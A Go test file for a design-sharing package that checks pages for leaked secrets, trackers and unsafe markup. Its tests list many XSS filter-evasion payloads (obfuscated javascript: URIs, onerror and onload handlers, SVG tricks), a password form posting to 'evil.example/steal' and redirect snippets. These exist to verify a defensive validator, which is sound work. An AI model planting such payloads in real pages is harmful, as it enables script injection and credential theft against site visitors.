package designshare

import (
	"context"
	"strings"
	"testing"

	"github.com/enowx/enowx/proto"
)

func bundleOf(page string) Bundle {
	return Build(proto.CanvasFrame{Width: 800, Height: 600, HTML: page}, nil, nil)
}

func kinds(found []Finding, sev string) string {
	var out []string
	for _, f := range found {
		if f.Severity == sev {
			out = append(out, f.Kind)
		}
	}
	return strings.Join(out, "; ")
}

// A secret anywhere stops a publish, and no finding repeats its value.
func TestCheckRefusesSecretsAndHidesThem(t *testing.T) {
	secret := "ghp_" + strings.Repeat("a1B2", 10)
	for name, c := range map[string]struct {
		b Bundle
		t Text
	}{
		"html":        {bundleOf(`<p>` + secret + `</p>`), Text{}},
		"title":       {bundleOf(`<p>x</p>`), Text{Title: secret}},
		"description": {bundleOf(`<p>x</p>`), Text{Description: secret}},
		"prompt":      {bundleOf(`<p>x</p>`), Text{Prompt: secret}},
		"asset":       {Bundle{Format: Format, Frame: Frame{Width: 1, Height: 1}, Assets: map[string][]byte{"a.txt": []byte(secret)}}, Text{}},
	} {
		found := Check(c.b, c.t)
		if !Refused(found) {
			t.Errorf("%s: a secret went through: %+v", name, found)
		}
		for _, f := range found {
			if strings.Contains(f.Kind+f.Where, secret) {
				t.Errorf("%s: a finding shows the value: %+v", name, f)
			}
		}
	}
}

func TestCheckRefusesTrackersAndPasswordForms(t *testing.T) {
	for _, page := range []string{
		`<script src="https://www.googletagmanager.com/gtag/js?id=G-1"></script>`,
		`<form action="https://evil.example/steal"><input type="password"></form>`,
	} {
		if found := Check(bundleOf(page), Text{}); !Refused(found) {
			t.Errorf("went through: %s", page)
		}
	}
	if found := Check(bundleOf(`<form action="#"><input type="password"></form>`), Text{}); Refused(found) {
		t.Errorf("a form that stays here was refused: %+v", found)
	}
}

// What the creator has to look at is a warning, by its kind.
func TestCheckWarns(t *testing.T) {
	for want, page := range map[string]string{
		"an email address":         `<p>ada@example.com</p>`,
		"a phone number":           `<p>call +62 812 3456 7890</p>`,
		"an internal address":      `<a href="/x">http://localhost:3000</a>`,
		"a request out of":         `<script>fetch('/x')</script>`,
		"a link to another":        `<a href="https://example.com">x</a>`,
		"changes the page's":       `<script>location.href='https://a.example'</script>`,
		"sends its viewer":         `<meta http-equiv="refresh" content="0;url=https://a.example">`,
		"where its addresses lead": `<base href="https://a.example">`,
		"which won't load":         `<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter">`,
	} {
		found := Check(bundleOf(page), Text{})
		if Refused(found) {
			t.Errorf("%s: refused: %+v", want, found)
		}
		if !strings.Contains(kinds(found, Warn), want) {
			t.Errorf("no warning of %q in %q", want, kinds(found, Warn))
		}
	}
}

// A file's bytes in a page aren't mistaken for phone numbers.
func TestCheckIgnoresInlinedFiles(t *testing.T) {
	page := `<img src="data:image/png;base64,` + strings.Repeat("0812345678901234", 50) + `">`
	if found := Check(bundleOf(page), Text{}); len(found) != 0 {
		t.Fatalf("found in an inlined file: %+v", found)
	}
}

// Only what the design shows comes along, and what a canvas holds around it
// has nowhere to go in a bundle.
func TestBuildHoldsOnlyWhatTheDesignShows(t *testing.T) {
	read := func(name string) ([]byte, error) { return []byte("bytes of " + name), nil }
	b := Build(proto.CanvasFrame{ID: "f", Name: "Home", Width: 10, Height: 20, Favorite: true, Page: "Home", HTML: `<img src="assets/a.png">`,
		Elements: []proto.CanvasElement{{Type: "image", Src: "b.png"}, {Type: "image", Src: "https://x.example/c.png"}}}, nil, read)
	if len(b.Assets) != 2 || b.Assets["a.png"] == nil || b.Assets["b.png"] == nil {
		t.Fatalf("assets: %v", b.Assets)
	}
	data, err := b.Marshal()
	if err != nil {
		t.Fatal(err)
	}
	back, err := Parse(data)
	if err != nil || back.Frame.Name != "Home" {
		t.Fatalf("parse: %v %+v", err, back.Frame)
	}
	if _, err := Parse([]byte(`{"format":"other/1"}`)); err == nil {
		t.Fatal("an unknown format parsed")
	}
}

func TestCheckComponent(t *testing.T) {
	if err := CheckComponent(bundleOf(`<style>.a{color:red}</style><button class="a">Go</button>`)); err != nil {
		t.Fatal(err)
	}
	for _, page := range []string{`<script>1</script>`, `<button onclick="x()">Go</button>`, strings.Repeat("x", MaxComponent+1)} {
		if CheckComponent(bundleOf(page)) == nil {
			t.Errorf("taken as a component: %.40s", page)
		}
	}
}

func TestEmbedLibraries(t *testing.T) {
	fetched := []string{}
	fetch := func(_ context.Context, url string) ([]byte, error) {
		fetched = append(fetched, url)
		return []byte("js"), nil
	}
	page := `<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js"></script>` +
		`<script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.2/anime.min.js"></script>` +
		`<script src="https://evil.example/a@1.js"></script>`
	out := EmbedLibraries(context.Background(), page, fetch)
	if len(fetched) != 1 || !strings.Contains(out, "data:text/javascript;base64,anM=") {
		t.Fatalf("fetched %v: %s", fetched, out)
	}
	if !strings.Contains(out, "anime.min.js") || !strings.Contains(out, "evil.example") {
		t.Fatalf("what isn't embedded changed: %s", out)
	}
}

// A draft comes from the design: a canvas's chat isn't an input it has.
func TestDraftPrompt(t *testing.T) {
	b := bundleOf(`<style>body{font-family:Inter,sans-serif;color:#112233}</style><header></header><h1>Hello</h1><button>Go</button>`)
	p := DraftPrompt(b, "Landing", "A calm page.", "page")
	for _, want := range []string{"Landing", "A calm page.", "a header", `heading "Hello"`, `button "Go"`, "#112233", "Inter"} {
		if !strings.Contains(p, want) {
			t.Errorf("no %q in:\n%s", want, p)
		}
	}
}

func TestSlug(t *testing.T) {
	for in, want := range map[string]string{"Hello, World!": "hello-world", "  ": "design", "Kartu Harga 2": "kartu-harga-2"} {
		if got := Slug(in); got != want {
			t.Errorf("%q: %q", in, got)
		}
	}
}

// A shape takes 3 bytes of a bundle and far more once read: the count stops first.
func TestParseRefusesTooManyShapes(t *testing.T) {
	bundleOf := func(n int) []byte {
		return []byte(`{"format":"` + Format + `","frame":{"name":"x","width":10,"height":10,"elements":[{}` + strings.Repeat(",{}", n-1) + `]}}`)
	}
	if _, err := Parse(bundleOf(mostElements)); err != nil {
		t.Fatalf("as many as a design has: %v", err)
	}
	if _, err := Parse(bundleOf(mostElements + 1)); err == nil {
		t.Fatal("one more was read")
	}
	if _, err := Parse([]byte(`{"format":"` + Format + `","frame":{"width":10,"height":10,"elements":"no"}}`)); err == nil {
		t.Fatal("shapes that aren't a list")
	}
}

// What people paste into their own pages runs nothing, however it's written.
func TestCheckComponentWalksThePage(t *testing.T) {
	for _, page := range []string{
		`<script>x()</script>`,
		`<SCRIPT/x>x()</SCRIPT>`,
		`<svg><script>x()</script></svg>`,
		`<button onclick="x()">Go</button>`,
		`<img/onerror=x() src=y>`,
		`<img src=y"onerror=x()>`,
		`<svg/onload=x()>`,
		`<body onload=x()>`,
		`<iframe srcdoc="<p>x</p>"></iframe>`,
		`<iframe src="https://example.com"></iframe>`,
		`<embed src="x.swf">`,
		`<object data="x"></object>`,
		`<a href=javascript:x()>a</a>`,
		`<a href="JaVaScRiPt:x()">a</a>`,
		`<a href=" javascript:x()">a</a>`,
		"<a href=\"java\tscript:x()\">a</a>",
		"<a href=\"java\nscript:x()\">a</a>",
		`<a href="java&#10;script:x()">a</a>`,
		`<a href="&#106;avascript:x()">a</a>`,
		`<a href="&#x6a;avascript&colon;x()">a</a>`,
		`<a href="java%0ascript:x()">a</a>`,
		`<a href="%6a%61vascript:x()">a</a>`,
		`<a href="vbscript:x">a</a>`,
		`<a href="data:text/html,<script>x()</script>">a</a>`,
		`<form action="javascript:x()"><button>Go</button></form>`,
		`<svg><a xlink:href="javascript:x()"><text>a</text></a></svg>`,
		`<svg><animate attributeName="href" to="javascript:x()"/></svg>`,
		`<base href="https://example.com/">`,
		`<meta http-equiv="refresh" content="0;url=https://example.com">`,
		`<template><img src=y onerror=x()></template>`,
		`<noscript><img src=y></noscript>`,
	} {
		if err := CheckComponent(bundleOf(page)); err == nil {
			t.Errorf("taken as a component: %s", page)
		}
	}
	for _, page := range []string{
		`<style>.a{color:red}</style><button class="a">Go</button>`,
		`<a href="https://example.com/?q=javascript:x">a</a>`,
		`<p>turn on=off, onward</p>`,
		`<img src="data:image/png;base64,AAAA" alt="only a picture">`,
		`<input value="100%" placeholder="50%zz">`,
		`<a href="#on">on</a>`,
	} {
		if err := CheckComponent(bundleOf(page)); err != nil {
			t.Errorf("%s: %v", page, err)
		}
	}
}

// However a page spells changing its address, its creator hears of it.
func TestCheckWarnsOfEveryWayToNavigate(t *testing.T) {
	for _, code := range []string{
		`location="https://evil.example"`,
		`location.href = "https://evil.example"`,
		`location["href"]="https://evil.example"`,
		`window.location['href'] = "https://evil.example"`,
		"top.location[`href`]='x'",
		`location.assign("x")`,
		`location["replace"]("x")`,
	} {
		found := Check(bundleOf(`<script>`+code+`</script>`), Text{})
		if !strings.Contains(kinds(found, Warn), "changes the page's address") {
			t.Errorf("no warning of %s: %v", code, found)
		}
	}
	if found := Check(bundleOf(`<script>if(location.href=="x"){}</script>`), Text{}); strings.Contains(kinds(found, Warn), "changes the page's address") {
		t.Errorf("reading it: %v", found)
	}
}
